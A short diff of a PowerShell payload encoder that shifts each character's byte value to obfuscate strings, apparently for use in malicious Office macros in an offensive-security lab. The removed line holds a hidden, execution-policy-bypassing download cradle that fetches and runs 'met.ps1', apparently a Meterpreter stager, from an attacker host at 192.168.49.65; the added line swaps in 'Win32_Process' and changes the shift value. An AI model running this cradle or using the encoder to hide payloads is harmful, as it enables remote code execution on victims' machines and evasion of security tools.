@@ -1,10 +1,10 @@
-$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.65/met.ps1'))"
+$payload = "Win32_Process"
 #$payload = $args[0]
 
 [string]$output = ""
 
 $payload.ToCharArray() | %{
-    [string]$thischar = [byte][char]$_ + 17
+    [string]$thischar = [byte][char]$_ + 9
     if($thischar.Length -eq 1)
     {
         $thischar = [string]"00" + $thischar
